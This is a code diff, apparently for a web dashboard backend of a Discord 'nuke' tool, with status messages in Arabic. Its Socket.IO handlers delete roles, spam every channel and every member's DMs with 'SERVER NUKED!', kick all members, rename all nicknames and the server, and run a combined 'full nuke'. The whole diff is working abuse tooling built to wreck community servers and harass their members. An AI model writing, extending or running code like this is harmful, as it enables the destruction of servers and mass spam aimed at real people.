+        emit('operation_error', {'message': 'No role ID provided'})
+        return
     
-    async def delete_role_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            role = guild.get_role(int(role_id))
-            if role:
-                await role.delete()
-                roles = await current_bot.get_roles(guild)
-                emit('roles_list', {'roles': roles})
-                emit('operation_complete', {'message': f'Deleted role {role.name}'})
-            else:
-                emit('operation_error', {'message': 'Role not found'})
+    # Run in a separate thread
+    def delete_role():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        success = loop.run_until_complete(bot.delete_role(bot.current_server_id, role_id))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم حذف الرول بنجاح'}, room=request.sid)
+            # Refresh roles list
+            handle_get_roles()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في حذف الرول'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(delete_role_task(), bot_loop)
+    threading.Thread(target=delete_role).start()
 
 @socketio.on('spam_channels')
 def handle_spam_channels(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    message = data.get('message', 'Spam message')
-    count = data.get('count', 10)
+    message = data.get('message', 'SERVER NUKED!')
+    count = data.get('count', 5)
     
-    async def spam_channels_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.spam_channels(guild, message, count):
-                emit('operation_progress', progress_data)
-            
-            emit('operation_complete', {'message': 'Spam completed'})
+    # Run in a separate thread
+    def spam_channels():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إرسال السبام للرومات...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.spam_channels(bot.current_server_id, message, count))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم إرسال السبام للرومات بنجاح'}, room=request.sid)
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في إرسال السبام للرومات'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(spam_channels_task(), bot_loop)
+    threading.Thread(target=spam_channels).start()
 
 @socketio.on('spam_dms')
 def handle_spam_dms(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    message = data.get('message', 'Spam message')
+    message = data.get('message', 'SERVER NUKED!')
     
-    async def spam_dms_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.spam_dms(guild, message):
-                emit('operation_progress', progress_data)
-            
-            emit('operation_complete', {'message': 'DM spam completed'})
+    # Run in a separate thread
+    def spam_dms():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إرسال السبام للأعضاء...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.spam_dms(bot.current_server_id, message))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم إرسال السبام للأعضاء بنجاح'}, room=request.sid)
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في إرسال السبام للأعضاء'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(spam_dms_task(), bot_loop)
+    threading.Thread(target=spam_dms).start()
 
 @socketio.on('update_server')
 def handle_update_server(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
     name = data.get('name')
+    if not name:
+        emit('operation_error', {'message': 'No name provided'})
+        return
     
-    async def update_server_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            success = await current_bot.update_server(guild, name=name)
-            if success:
-                info = await current_bot.get_server_info(guild)
-                emit('server_info', info)
-                emit('operation_complete', {'message': 'Server updated'})
-            else:
-                emit('operation_error', {'message': 'Failed to update server'})
+    # Run in a separate thread
+    def update_server():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        success = loop.run_until_complete(bot.update_server(bot.current_server_id, name))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم تحديث اسم السيرفر بنجاح'}, room=request.sid)
+            # Refresh server info
+            handle_get_server_info()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في تحديث اسم السيرفر'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(update_server_task(), bot_loop)
+    threading.Thread(target=update_server).start()
 
 @socketio.on('kick_all_members')
 def handle_kick_all_members():
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    async def kick_members_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.kick_all_members(guild):
-                emit('operation_progress', progress_data)
-            
-            emit('operation_complete', {'message': 'Kicked all members'})
+    # Run in a separate thread
+    def kick_all_members():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء طرد جميع الأعضاء...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.kick_all_members(bot.current_server_id))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم طرد جميع الأعضاء بنجاح'}, room=request.sid)
+            # Refresh server info
+            handle_get_server_info()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في طرد جميع الأعضاء'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(kick_members_task(), bot_loop)
+    threading.Thread(target=kick_all_members).start()
+
+@socketio.on('change_all_nicknames')
+def handle_change_all_nicknames(data):
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
+        emit('operation_error', {'message': 'No server selected'})
+        return
+    
+    nickname = data.get('nickname')
+    if not nickname:
+        emit('operation_error', {'message': 'No nickname provided'})
+        return
+    
+    # Run in a separate thread
+    def change_all_nicknames():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء تغيير أسماء جميع الأعضاء...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.change_all_nicknames(bot.current_server_id, nickname))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم تغيير أسماء جميع الأعضاء بنجاح'}, room=request.sid)
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في تغيير أسماء جميع الأعضاء'}, room=request.sid)
+    
+    threading.Thread(target=change_all_nicknames).start()
 
 @socketio.on('execute_full_nuke')
-def handle_execute_full_nuke(data):
-    if not current_bot or not current_guild:
+def handle_execute_full_nuke(options):
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    async def full_nuke_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.execute_full_nuke(guild, data):
-                emit('full_nuke_progress', progress_data)
-            
-            # Refresh data after nuke
-            info = await current_bot.get_server_info(guild)
-            channels = await current_bot.get_channels(guild)
-            roles = await current_bot.get_roles(guild)
-            
-            emit('server_info', info)
-            emit('rooms_list', {'rooms': channels})
-            emit('roles_list', {'roles': roles})
-            emit('full_nuke_complete')
+    # Run in a separate thread
+    def execute_full_nuke():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('full_nuke_progress', {'overall_progress': 10, 'message': 'بدء تنفيذ النيوك الشامل...'}, room=request.sid)
+        
+        # Execute full nuke
+        success = loop.run_until_complete(bot.execute_full_nuke(bot.current_server_id, options))
+        loop.close()
+        
+        if success:
+            socketio.emit('full_nuke_complete', room=request.sid)
+            # Refresh all data
+            handle_get_server_info()
+            handle_get_rooms()
+            handle_get_roles()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في تنفيذ النيوك الشامل'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(full_nuke_task(), bot_loop)
+    threading.Thread(target=execute_full_nuke).start()
 
+@socketio.on('logout')
+def handle_logout():
+    if request.sid in bot_instances:
+        bot = bot_instances[request.sid]
+        try:
+            bot.stop_bot()
+        except:
+            pass
+        del bot_instances[request.sid]
+    
+    if request.sid in current_tokens:
+        del current_tokens[request.sid]
+    
+    emit('auth_error', {'message': 'تم تسجيل الخروج بنجاح'})
+
+# Run the app
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=port, debug=False)
+    port = int(os.environ.get('PORT', 8080))
+    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
